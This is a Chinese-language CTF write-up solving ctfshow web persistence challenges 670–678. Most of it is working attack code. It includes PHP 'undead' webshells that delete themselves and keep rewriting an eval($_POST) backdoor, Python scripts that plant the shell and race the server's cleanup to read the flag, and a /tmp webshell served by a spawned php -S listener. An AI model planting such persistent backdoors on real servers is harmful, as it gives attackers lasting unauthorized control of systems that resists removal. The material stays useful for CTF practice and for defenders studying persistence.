---
title: "ctfshow-权限维持"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# ctfshow-权限维持

### web670

这里的check貌似是删web根目录文件，那么可以用awd的常规思路，写一个不死马：

~~~php
GET:?action=cmd

POST:cmd=file_put_contents('a.php', '<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \'shell.php\';$code = \'<?php @eval($_POST[1]);?>\';while (1) {file_put_contents($file, $code);usleep(5000);}?>');
~~~

访问不死马使其解析，将木马写入内存

然后申请check，再连接shell.php即可：

![image-20241125175540487](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125175540663-1059963057.png)

### web671

同样写不死马即可，flag在根目录：

![image-20241125180132877](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125180133066-1725898859.png)

### web672

同理：

![image-20241125180627088](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125180627560-549666934.png)

### web673

同理。。

既然不死马一直能打，那我们可以尝试构造一个python脚本：

 ~~~python
import requests
url="http://ed21030c-afd5-4efd-a3c6-d6728eef56f5.challenge.ctf.show/"
data1={'cmd':"file_put_contents('a.php',\"<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);\\$file = 'shell.php';\\$code = '<?php @eval(\\$_POST[1]);?>';while (1) {file_put_contents(\\$file, \\$code);usleep(5000);}?>\");"}
r=requests.post(url+'?action=cmd',data=data1)
try:
	requests.get(url+'a.php',timeout=(1,1))
except:
	requests.get(url+'?action=check')
	r=requests.post(url+'shell.php',data={'1':'system("cat /f*");'})
	print(r.text)
 ~~~

一跑即出：

![image-20241125182123187](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125182123450-1052963366.png)

### web674-676

同理，脚本跑即可

### web677

除了tmp目录都没有写权限

这里同样可以用加载进程的思维：

~~~
GET:?action=cmd

POST:cmd=system('sleep 10;cat /f*');
~~~

执行后会加载十秒，在此期间，另开一个页面来启动check，即可cat到flag：

![image-20241125203945891](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125203947992-1056072447.png)

### web678

> **check后，会停止一切web服务，包括nginx php-fpm** **天地同寿的打法，你能应付吗**

tmp目录可写，那么就在这个目录上做文章

中间件都没了，那就用php直接在/tmp起一个服务，就能解析tmp中的php文件了

* tmp目录下生成木马文件:

  ~~~
  cmd=system('cd /tmp;echo "<?php eval(\$_POST[1]);?>" > index.php');
  ~~~

* 开启web服务：

  ~~~
  cmd=system('cd /tmp;php -S 0.0.0.0:80');
  ~~~

* 前面的思路结合一下，因为手动开启的web服务check后也会被停掉，所以要check并延时开开启web服务，脚本如下：

  ~~~python
  import requests
  url="http://bd71e0b1-031d-413b-8e3c-9f9e6d912d7b.challenge.ctf.show"
  
  data1={'cmd':"system('cd /tmp;echo \"<?php eval(\$_POST[1]);?>\" > index.php');"}
  r=requests.post(url+'?action=cmd',data=data1)
  
  
  data2={'cmd':"system('sleep 3;cd /tmp;php -S 0.0.0.0:80');"}
  try:
  	requests.post(url+'?action=cmd',data=data2,timeout=(1,1))
  except:
  	requests.get(url+'?action=check')
  	while True:
  		r=requests.post(url,data={'1':'system("cat /f*");'})
  		if "ctfshow{" in r.text:
  			print(r.text)
  			break
  ~~~

  ![image-20241125205501169](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125205502841-1621720932.png)

### 总结

主要运用的是check不杀进程的思路，解法非常的ctf，在实战的维持中往往需要考虑隐蔽性和持久性，所以上面的题顶多给ctf作作参考